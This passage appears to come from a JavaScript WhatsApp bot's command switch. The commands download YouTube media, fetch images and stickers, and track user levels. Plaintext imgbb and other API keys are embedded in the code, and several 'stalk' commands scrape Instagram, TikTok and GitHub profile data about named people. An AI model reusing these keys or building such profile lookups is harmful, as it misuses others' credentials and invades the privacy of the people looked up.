			let yut = await yts(
				q)
			yta(yut.videos[0]
					.url)
				.then(async (
					res
				) => {
					const {
						thumb,
						title,
						filesizeF,
						filesize
					} =
					res
					const
						capti =
						`*P L A Y*\n\n*SILAHKAN DIPILIH TYPE NYA KAK* _@${senderr.split("@")[0]}_\n\n*_Title_* : ${g}${title}${g}\n *_Views_* : ${g}${yut.videos[0].views}${g}\n*_Duration_* : ${g}${yut.videos[0].timestamp}${g}\n *_URL_* : ${g}${yut.videos[0].url}${g}`
					//sendMediaURL(from, thumb, capti)
					ya = await getBuffer(
						thumb
					)
					sendButLocation
						(from,
							capti,
							`${fake}\n @0`, {
								jpegThumbnail: ya
							},
							[{
								buttonId: `${prefix}playy ${q}`,
								buttonText: {
									displayText: '🎵AUDIO'
								},
								type: 1
							},
							{
								buttonId: `${prefix}play2 ${q}`,
								buttonText: {
									displayText: '🎥VIDEO'
								},
								type: 1
							}], {
								contextInfo: {
									mentionedJid: [
										senderr,
										'0@s.whatsapp.net'
									]
								}
							}
						)
				})
			break
			//case 'hentai':
			//   getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${setting.lolkey}`).then((gambar) => {
			// Maslent.sendMessage(from, gambar, image, { quoted: mek })
			//}) 
			///     break
		case 'playy':
		case 'lagu':
			if (args.length < 1)
				return reply(
					'Apa Yang Mau Dicari?'
				)
			teks = args.join(
				' ')
			reply(mess.wait)
			if (!teks.endsWith(
					"-doc")) {
				res = await yts(
					`${teks}`
				).catch(
					e => {
						reply
							(
								'_[ ! ] Error Query Yang Anda Masukan Tidak Ada_'
							)
					})
				reply(
					` Playing ${res.all[0].title}`
				)
				let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
				/////////////sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
				res =
					await y2mateA(
						res.all[
							0]
						.url)
					.catch(
						e => {
							reply
								(
									'_[ ! ] Error Saat Memasuki Web Y2mate_'
								)
						})
				sendFileFromUrl(
					res[0]
					.link,
					audio, {
						quoted: mek,
						mimetype: 'audio/mp4',
						filename: res[
								0
							]
							.output
					})
			}
			if (teks.endsWith(
					"-doc")) {
				const tec = teks
					.split(
						"-doc")
				res = await yts(
					`${tec}`
				).catch(
					e => {
						reply
							(
								'_[ ! ] Error Query Yang Anda Masukan Tidak Ada_'
							)
					})
				reply(
					`.Playing ${res.all[0].title}`
				)
				let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
				sendFileFromUrl(
					res.all[
						0]
					.image,
					image, {
						quoted: mek,
						caption: thumbInfo
					})
				res =
					await y2mateA(
						res.all[
							0]
						.url)
					.catch(
						e => {
							reply
								(
									'_[ ! ] Error Saat Memasuki Web Y2mate_'
								)
						})
				sendFileFromUrl(
					res[0]
					.link,
					document, {
						quoted: mek,
						mimetype: 'audio/mp3',
						filename: res[
								0
							]
							.output
					})
			}
			break
		case 'video':

			if (args.length < 1)
				return reply(
					'*Masukan judul nya?*'
				)
			reply(
				'Loading.... '
			)
			acaa = args.join(
				" ")
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytvideo?apikey=Chikey&query=${acaa}l`
				)

			if (anu.error)
				return reply(anu
					.error)
			infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
			///////buffer = await getBuffer(anu.result.thumbnail)
			buffer1 =
				await getBuffer(
					anu.result
					.url_video)
			Maslent.sendMessage(
				from,
				buffer1,
				video, {
					mimetype: 'video/mp4',
					filename: `${anu.result.video}.mp4`,
					quoted: mek,
					caption: 'Nih Gan'
				})
			break

		case 'play2':
			//     if (!isRegister) return reply("Kamu Belom Terdaftar Kak!\nketik *!daftarnya* untuk mendaftar")
			if (args.length < 1)
				return reply(
					'Apa Yang Mau Dicari?'
				)
			teks = args.join(
				' ')
			reply(mess.wait)
			if (!teks.endsWith(
					"-doc")) {
				res = await yts(
					`${teks}`
				).catch(
					e => {
						reply
							(
								'_Error Judul Yang Anda Masukan Tidak Ada_'
							)
					})

				reply(
					`♬ Playing ${res.all[0].title} ♬`
				)
				let thumbInfo = `*Youtube Play Downloader*
               
*Judul* : ${res.all[0].title}
*Type* : mp3
*ID* : ${res.all[0].videoId}
*Publikasi* : ${res.all[0].ago}
*Ditonton* : ${res.all[0].views}
*Durasi* : ${res.all[0].timestamp}
*Channel* : ${res.all[0].author.name}
*Link* : ${res.all[0].author.url}

*_Harap tunggu sebentar*`

				sendFileFromUrl(
					res.all[
						0]
					.image,
					image, {
						quoted: mek,
						thumbnail: gha,
						caption: thumbInfo
					})
				res =
					await y2mateV(
						res.all[
							0]
						.url)
					.catch(
						e => {
							reply
								(
									'_ Error Saat Memasuki Web Y2mate_'
								)
						})
				sendFileFromUrl(
					res[0]
					.link,
					video, {
						quoted: mek,
						mimetype: 'video/mp4',
						filename: res[
								0
							]
							.output
					})
			}
			break
		case 'play':

			if (!q) return reply(
				'[BOT]Linknya Mana bwang?'
			)
			buttons = [{
				buttonId: `${prefix}ytmp4 ${q}`,
				buttonText: {
					displayText: `🎥 VIDEO/PID`
				},
				type: 1
			}, {
				buttonId: `${prefix}playyy ${q}`,
				buttonText: {
					displayText: '🎵 LAGU/MUSIC'
				},
				type: 1
			}]
			imageMsg = (
					await Maslent
					.prepareMessageMedia(
						fs
						.readFileSync(
							`./XNXXs2/ppk2.jpg`
						),
						'imageMessage', {
							thumbnail: fs
								.readFileSync(
									`./XNXXs2/ppk2.jpg`
								)
						}))
				.imageMessage
			buttonsMessage = {
				footerText: 'Dimohon Untuk Tidak Spam Ya Sayang gunakan Dengan Bijak Gausa Kampungan!',
				imageMessage: imageMsg,
				contentText: `Silahkan Pilih Media Yg Akan Di Download kak`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			Maslent
				.relayWAMessage(
					prep)
			break
		case 'playyy':


			if (args.length ===
				0) return reply(
				`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`
			)
			var srch = args
				.join('')
			aramas = await yts(
				srch);
			aramat = aramas.all
			var mulaikah =
				aramat[0].url
			try {
				yta(mulaikah)
					.then((
						res
					) => {
						const {
							dl_link,
							thumb,
							title,
							filesizeF,
							filesize
						} =
						res
						axios
							.get(
								`https://api.zeks.me/api/ytmp3?apikey=Ichikeyku&query=${dl_link}`
							)
							.then(
								async (
									a
								) => {
									if (Number(
											filesize
										) >=
										100000
									)
										return sendMediaURL(
											from,
											thumb,
											`*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
										)
									const
										captions =
										`*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
									sendMediaURL
										(from,
											thumb,
											captions
										)
									await sendMediaURL
										(from,
											dl_link
										)
										.catch(
											() =>
											reply(
												'error'
											)
										)
								})
					})
			} catch (err) {
				reply("Erorr")
			}
			break

		case 'video':
			if (!isPremium)
				return reply(
					mess
					.prem)
			if (args.length < 1)
				return reply(
					'*Masukan judul nya?*'
				)
			reply(
				'Loading.... '
			)
			acaa = args.join(
				" ")
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytvideo2?query=${acaa}&apikey=Chikey`
				)

			if (anu.error)
				return reply(anu
					.error)
			infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
			///////buffer = await getBuffer(anu.result.thumbnail)
			buffer1 =
				await getBuffer(
					anu.result
					.url_video)
			Maslent.sendMessage(
				from,
				buffer1,
				video, {
					mimetype: 'video/mp4',
					filename: `${anu.result.video}.mp4`,
					quoted: mek,
					caption: 'Nih Gan'
				})
			break


		case 'lirik':
			if (!q) return reply(
				mess
				.wrongFormat
			)
			reply(mess.wait)
			lirikLagu(q).then((
				res
			) => {
				let lirik = `Lirik Lagu ${q}

               ${res[0].result}
`
				reply(
					lirik
				)
			})
			break
		case "pinterest":
			if (!q) return reply(
				"gambar apa?"
			);
			reply(
				"Sedang mencari Imagenya🔍"
			)
			let pin = await hx
				.pinterest(q);
			let ac = pin[Math
				.floor(Math
					.random() *
					pin
					.length)
			];
			let di =
				await getBuffer(
					ac);
			await Maslent
				.sendMessage(
					from, di,
					image, {
						quoted: mek
					})
			break;

		case 'wallpaper':
			if (args.length ==
				0) return reply(
				`Kirim perintah *${prefix+command} [ query ]*\nContoh : ${prefix}anime `
			)
			try {
				wall.getAnimeWall2(
					`${body.slice(11)}`
				).then(
					res => {
						getBuffer
							(res[
									0
								]
								.image
							)
							.then(
								ress =>
								Maslent
								.sendMessage(
									from,
									ress,
									image, {
										quoted: mek,
										caption: `${res[0].title}`
									}
								)
							)
					})
			} catch (e) {
				reply(
					`Maaf ${pushname}, wallpaper yang kamu cari tidak dapat ditemukan`
				)
			}
			break
		case 'pinterest2':
			if (!q) return reply(
				'yg mau di cari apa?'
			)
			pinterest(`${q}`)
				.then(data => {
					const
						amsulah =
						data
						.result
					const
						pimterest =
						amsulah[
							Math
							.floor(
								Math
								.random() *
								amsulah
								.length
							)
						]
					sendMediaURL
						(from,
							pimterest,
							`Pinterest : ${q}`
						)
				})
			break

		case 'shopee':
			try {
				if (args
					.length == 0
				) return reply(
					`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`
				)
				query = args
					.join(" ")
				reply(mess.wait)
				get_data =
					await fetchJson(
						`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`
					)
				get_data =
					get_data
					.data
				teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
				for (let i =
						0; i <
					get_data
					.length; i++
				) {
					teks +=
						`\`\`\`き⃟👉 Nama : ${get_data[i].name}\`\`\`
\`\`\`き⃟👉 Harga : ${get_data[i].harga}\`\`\`
\`\`\`き⃟👉 Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`き⃟👉 Lokasi : ${get_data[i].location}\`\`\`
\`\`\`き⃟👉 Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`き⃟👉 Stok : ${get_data[i].stock}\`\`\`
\`\`\`き⃟👉 Informasi : ${get_data[i].information}\`\`\`
\`\`\`き⃟👉 Link : ${get_data[i].url}\`\`\``
				}
				ini_buffer =
					await getBuffer(
						get_data[
							0]
						.img_detail[
							0])
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: teks
						})
			} catch {
				reply(
					`Maaf produk ${query} tidak ditemukan`
				)
			}
			break
		case 'playstore':
			try {
				if (args
					.length == 0
				) return reply(
					`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`
				)
				query = args
					.join(" ")
				reply(mess.wait)
				get_result =
					await fetchJson(
						`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`
					)
				get_result =
					get_result
					.result
				teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
				for (let i =
						0; i <
					get_result
					.length; i++
				) {
					teks += `\`\`\`き⃟👉 Title : ${get_result[i].title}\`\`\`
\`\`\`き⃟👉 Harga : ${get_result[i].price}\`\`\`
\`\`\`き⃟👉 Rate : ${get_result[i].rating}\`\`\`
\`\`\`き⃟👉 Link : ${get_result[i].url}\`\`\`

`
				}
				ini_buffer =
					await getBuffer(
						get_result[
							0]
						.thumb)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: teks
						})
			} catch {
				reply(
					`Maaf aplikasi ${query} tidak ditemukan`
				)
			}
			break
		case 'yts':
		case 'ytsearch':
			if (!q) return reply(
				mess
				.wrongFormat
			)
			reply(mess.wait)
			try {
				res = await yts(
					q)
				a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
				for (let i of
						res
						.all) {
					a += `\`\`\`き⃟👉 Title : ${i.title}\`\`\`
\`\`\`き⃟👉 Views : ${i.views}\`\`\`
\`\`\`き⃟👉 Upload : ${i.ago}\`\`\`
\`\`\`き⃟👉 Durasi : ${i.timestamp}\`\`\`
\`\`\`き⃟👉 Channel : ${i.author.name}\`\`\`
\`\`\`き⃟👉 Link : ${i.url}\`\`\``
				}
				b = a.trim()
				sendFileFromUrl(
					res.all[
						0]
					.image,
					image, {
						quoted: mek,
						caption: b
					})
			} catch (e) {
				console.log(e)
				reply(`${e}`)
			}
			break
		case 'tourl':
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedVideo
				) && args
				.length == 0) {
				reply(mess.wait)
				boij =
					isQuotedImage ||
					isQuotedVideo ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await Maslent
					.downloadMediaMessage(
						boij)
				res =
					await uploadImages(
						owgi)
				reply(res)
			} else {
				reply(
					'kirim/reply gambar/video'
				)
			}
			break
		case 'imgtourl':
		case 'img2url':
			reply(mess.wait)
			var imgbb = require(
				'imgbb-uploader'
			)
			var encmedia =
				isQuotedImage ?
				JSON.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo :
				mek
			var media =
				await Maslent
				.downloadAndSaveMediaMessage(
					encmedia)
			imgbb('39d895963468b814fad0514bd28787e2',
					media)
				.then(data => {
					var caps =
						`*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
					ibb = fs
						.readFileSync(
							media
						)
					Maslent
						.sendMessage(
							from,
							ibb,
							image, {
								quoted: mek,
								caption: caps
							}
						)
				})
				.catch(err => {
					throw err
				})
			break
		case 'asupan': // shansekai                               
			reply(mess.wait)
			asupan()
				.then(async (
					body
				) => {
					asupann
						=
						body
						.split(
							'\n'
						)
					asupanx
						=
						asupann[
							Math
							.floor(
								Math
								.random() *
								asupann
								.length
							)
						]
					sendMediaURL
						(from,
							`http://sansekai.my.id/ptl_repost/${asupanx}`,
							'\`\`\`ASUPAN BRO GUA DAPAT DARI LORD ©KurrXd\`\`\`'
						)
					console
						.log(
							'Success sending video!'
						)
				})
				.catch(async (
					err
				) => {
					console
						.log(
							err
						)
					reply
						(
							`${err}`
						)
				})
			break
		case 'nulis':
		case 'tulis':
			if (args.length < 1)
				return reply(
					'Yang mau di tulis apaan?'
				)
			teks = args.join(
				' ')
			reply(mess.wait)
			nulis =
				encodeURIComponent(
					teks)
			res = await axios
				.get(
					`https://dt-04.herokuapp.com/nulis?text=${nulis}`
				)
			if (res.data.error)
				return reply(res
					.data
					.error)
			buff = Buffer.from(
				res.data
				.result
				.split(',')[
					1],
				'base64')
			Maslent.sendMessage(
				from, buff,
				image, {
					quoted: mek,
					caption: mess
						.success
				}).catch(
				e => {
					return reply(
						'_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_'
					)
				})
			break
			//------------------< Level >-------------------
		case 'level':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!isLevelingOn)
				return await reply(
					'Fitur leveling belum diaktifkan!'
				)
			let userLevel =
				level
				.getLevelingLevel(
					sender,
					_level)
			let userXp = level
				.getLevelingXp(
					sender,
					_level)
			let requiredXp =
				10 * Math.pow(
					userLevel, 2
				) + 50 *
				userLevel + 100
			let userRank = level
				.getUserRank(
					sender,
					_level)
			try {
				profilePic =
					await Maslent
					.getProfilePicture(
						sender)
			} catch {
				profilePic =
					errorImg
			}
			buffer =
				await getBuffer(
					`http://api.lolhuman.xyz/api/rank?apikey=${setting.lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`
				)
			teks =
				`*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
			Maslent.sendMessage(
				from,
				buffer,
				image, {
					caption: teks,
					quoted: mek
				})
			break
		case 'leaderboard': //Cek Leaderboard
		case 'leaderboards':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!isLevelingOn)
				return await reply(
					'Fitur leveling belum diaktifkan!'
				)
			const resp = _level
			_level.sort((a,
					b) => (a
					.xp < b
					.xp) ?
				1 : -1)
			let leaderboard =
				'-----[ *LEADERBOARD* ]----\n\n'
			try {
				for (let i =
						0; i <
					10; i++) {
					var roles =
						'Warrior III'
					if (resp[i]
						.level <=
						5) {
						roles =
							'Warrior II'
					} else if (
						resp[i]
						.level <=
						10) {
						roles =
							'Warrior I'
					} else if (
						resp[i]
						.level <=
						15) {
						roles =
							'Elite III'
					} else if (
						resp[i]
						.level <=
						20) {
						roles =
							'Elite II'
					} else if (
						resp[i]
						.level <=
						25) {
						roles =
							'Elite I'
					} else if (
						resp[i]
						.level <=
						30) {
						roles =
							'Master III'
					} else if (
						resp[i]
						.level <=
						35) {
						roles =
							'Master II'
					} else if (
						resp[i]
						.level <=
						40) {
						roles =
							'Master I'
					} else if (
						resp[i]
						.level <=
						45) {
						roles =
							'GrandMaster III'
					} else if (
						resp[i]
						.level <=
						50) {
						roles =
							'GrandMaster II'
					} else if (
						resp[i]
						.level <=
						55) {
						roles =
							'GrandMaster I'
					} else if (
						resp[i]
						.level <=
						60) {
						roles =
							'Epic III'
					} else if (
						resp[i]
						.level <=
						65) {
						roles =
							'Epic II'
					} else if (
						resp[i]
						.level <=
						70) {
						roles =
							'Epic I'
					} else if (
						resp[i]
						.level <=
						75) {
						roles =
							'Legend III'
					} else if (
						resp[i]
						.level <=
						80) {
						roles =
							'Legend II'
					} else if (
						resp[i]
						.level <=
						85) {
						roles =
							'Legend I'
					} else if (
						resp[i]
						.level <=
						90) {
						roles =
							'Mythic'
					} else if (
						resp[i]
						.level <=
						95) {
						roles =
							'Mythical Glory'
					} else if (
						resp[i]
						.level >=
						100) {
						roles =
							'Immortal'
					}

					leaderboard
						+=
						`➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
				}
				reply(
					leaderboard
				)
			} catch (err) {
				console.error(
					err)
				reply(
					'_Perlu setidaknya 10 user yang memiliki level di database!_'
				)
			}
			break
			//------------------< Stalk >-------------------
		case 'stalkgithub':
		case 'githubstalk':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Maslent-chan02`
			)
			reply(mess.wait)
			username = args[0]
			ini_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/github/${username}?apikey=${setting.lolkey}`
				)
			ini_result =
				ini_result
				.result
			ini_buffer =
				await getBuffer(
					ini_result
					.avatar)
			ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Username : ${ini_result.name}\`\`\`
\`\`\`き⃟👉 Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`き⃟👉 Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`き⃟👉 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`き⃟👉 Following : ${ini_result.following}\`\`\`
\`\`\`き⃟👉 Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`き⃟👉 Link : ${ini_result.url}\`\`\`
`
			Maslent.sendMessage(
				from,
				ini_buffer,
				image, {
					caption: ini_txt,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'stalkig':
		case 'igstalk':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Maslent.chan26`
			)
			reply(mess.wait)
			username = args[0]
			ini_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${setting.lolkey}`
				)
			ini_result =
				ini_result
				.result
			ini_buffer =
				await getBuffer(
					ini_result
					.photo_profile
				)
			ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Username : ${ini_result.username}\`\`\`
\`\`\`き⃟👉 Nama : ${ini_result.fullname}\`\`\`
\`\`\`き⃟👉 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`き⃟👉 Mengikuti : ${ini_result.following}\`\`\`
\`\`\`き⃟👉 Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`き⃟👉 Link : https://instagram.com/${ini_result.username}\`\`\`
`
			Maslent.sendMessage(
				from,
				ini_buffer,
				image, {
					caption: ini_txt,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'stalktiktok':
		case 'tiktokstalk':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} marz.hiatus`
			)
			reply(mess.wait)
			stalk_toktok = args[
				0]
			get_result =
				await fetchJson(
					`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			pp_tt =
				await getBuffer(
					get_result
					.user_picture
				)
			ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Username : ${get_result.username}\`\`\`
\`\`\`き⃟👉 Nama : ${get_result.nickname}\`\`\`
\`\`\`き⃟👉 Pengikut : ${get_result.followers}\`\`\`
\`\`\`き⃟👉 Mengikuti : ${get_result.followings}\`\`\`
\`\`\`き⃟👉 Likes : ${get_result.likes}\`\`\`
\`\`\`き⃟👉 Video : ${get_result.video}\`\`\`
\`\`\`き⃟👉 Deskripsi : ${get_result.bio}\`\`\`
`
			Maslent.sendMessage(
				from, pp_tt,
				image, {
					quoted: mek,
					caption: ini_txt,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'iguser':
			try {
				if (args
					.length == 0
				) return reply(
					`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`
				)
				query = args
					.join(" ")
				reply(mess.wait)
				get_result =
					await fetchJson(
						`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`
					)
				get_result =
					get_result
					.result
				teks =
					`*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
				for (let i =
						0; i <
					get_result
					.length; i++
				) {
					teks +=
						`*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
				}
				ini_buffer =
					await getBuffer(
						get_result[
							0]
						.profile_pic
					)
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: teks
						})
			} catch {
				reply(
					`Maaf username ${query} tidak ditemukan`
				)
			}
			break

		case 'ffstalk':
			if (args.length ==
				0) return reply(
				`Idnya mana kak?`
			)
			ff_id = args[0]
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/freefire/${ff_id}?apikey=genbotkey`
				)
			reply(`nih kak`)
			break
			//------------------< XNXXs1/Tools >-------------------

		case 'dadu': // by CHIKAA CHANTEKKXXZZ
			reply(mess.wait)
			dadu()
				.then(async (
					body
				) => {
					dadugerak
						=
						body
						.split(
							'\n'
						)
					dadugerakx
						=
						dadugerak[
							Math
							.floor(
								Math
								.random() *
								dadugerak
								.length
							)
						]
					sendWebp
						(from,
							dadugerakx
						)
				})
				.catch(async (
					err
				) => {
					console
						.error(
							err
						)
					reply
						(
							'Error!'
						)
				})
			break
		case 'doge':
			reply(mess.wait)
			fetch(
					'https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing'
				)
				.then(res => res
					.text())
				.then(body => {
					let tod =
						body
						.split(
							"\n"
						);
					let pjr =
						tod[Math
							.floor(
								Math
								.random() *
								tod
								.length
							)
						];
					sendWebp
						(from,
							pjr
						)
				})
			break
		case 'patrick':
			reply(mess.wait)
			fetch(
					'https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik'
				)
				.then(res => res
					.text())
				.then(body => {
					let tod =
						body
						.split(
							"\n"
						);
					let pjr =
						tod[Math
							.floor(
								Math
								.random() *
								tod
								.length
							)
						];
					sendWebp
						(from,
							pjr
						)
				})
			break
		case 'gura':
		case 'gawrgura':
			reply(mess.wait)
			fetch(
					'https://raw.githubusercontent.com/rashidsiregar28/data/main/gura'
				)
				.then(res => res
					.text())
				.then(body => {
					let tod =
						body
						.split(
							"\n"
						);
					let pjr =
						tod[Math
							.floor(
								Math
								.random() *
								tod
								.length
							)
						];
					sendWebp
						(from,
							pjr
						)
				})
			break
		case 'animestick':
		case 'stickeranime':
			reply(mess.wait)
			fetch(
					'https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick'
				)
				.then(res => res
					.text())
				.then(body => {
					let todd =
						body
						.split(
							"\n"
						);
					let pjrr =
						todd[
							Math
							.floor(
								Math
								.random() *
								todd
								.length
							)
						];
					sendWebp
						(from,
							pjrr
						)
				})
			break
		case 'telesticker':
		case 'telestiker':
			if (!q) return reply(
				`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`
			)
			reply(mess.wait)
			ini_url =
				await fetchJson(
					`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`
				)
			ini_sticker =
				ini_url.result
				.sticker
			reply('Sending ' +
				ini_sticker
				.length +
				' stickers...'
			)
			for (sticker_ in
				ini_sticker) {
				ini_buffer =
					await getBuffer(
						ini_sticker[
							sticker_
						])
				Maslent
					.sendMessage(
						from,
						ini_buffer,
						sticker, {}
					)
			}
			break
		case 'emoji':
			if (!q) return fakegroup(
				'emojinya?'
			)
			qes = args.join(' ')
			emoji.get(`${qes}`)
				.then(emoji => {
					teks =
						`${emoji.images[4].url}`
					sendStickerFromUrl
						(from,
							`${teks}`
						)
					console
						.log(
							teks
						)
				})
			break
		case 'ttp':
			if (args.length < 1)
				return reply(
					`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`
				)
			woy = args.join(" ")
			reply('wait....')
			anjay =
				`http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
			sendStickerFromUrl(
				from, anjay)
			break
		case 'stickwasted':
			//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
			if (mek.message
				.extendedTextMessage !=
				undefined || mek
				.message
				.extendedTextMessage !=
				null) {
				ger = JSON
					.parse(JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo
				reply(mess.wait)
				owgi =
					await Maslent
					.downloadMediaMessage(
						ger)
				await fs
					.writeFileSync(
						`./stickwasted.jpeg`,
						owgi)
				var imgbb =
					require(
						'imgbb-uploader'
					)
				anu =
					await imgbb(
						"3395a377ebac7e9f744c3683b44a2a59",
						'./stickwasted.jpeg'
					)
				teks =
					`${anu.display_url}`
				sendStickerFromUrl
					(from,
						`https://some-random-api.ml/canvas/wasted?avatar=${teks}`,
					)
				fs.unlinkSync(
					'./stickwasted.jpeg'
				)
			}
			break
		case 'attp':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} kurr`
			)
			buffer =
				await getBuffer(
					`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`
				)
			Maslent.sendMessage(
				from,
				buffer,
				sticker, {
					quoted: mek
				})
			break
		case 'ttg':
			if (!q) return await reply(
				mess
				.wrongFormat
			)
			reply(mess.wait)
			sendWebp(from,
